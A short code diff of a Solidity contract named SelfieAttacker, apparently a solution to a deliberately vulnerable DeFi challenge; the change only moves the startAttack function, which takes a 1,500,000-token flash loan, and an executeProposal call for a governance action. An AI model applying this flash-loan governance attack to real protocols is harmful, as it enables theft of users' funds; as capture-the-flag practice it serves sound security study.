@@ -105,6 +105,11 @@ contract SelfieAttacker is IERC3156FlashBorrower {
         recovery = _recovery;
     }
 
+    function startAttack() external {
+        // Initiate the flash loan
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
+    }
+
     function onFlashLoan(
         address _initiator,
         address /*_token*/,
@@ -129,10 +134,6 @@ contract SelfieAttacker is IERC3156FlashBorrower {
         return CALLBACK_SUCCESS;
     }
 
-    function startAttack() external {
-        // Initiate the flash loan
-        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
-    }
     function executeProposal() external {
         governance.executeAction(actionId);
     }
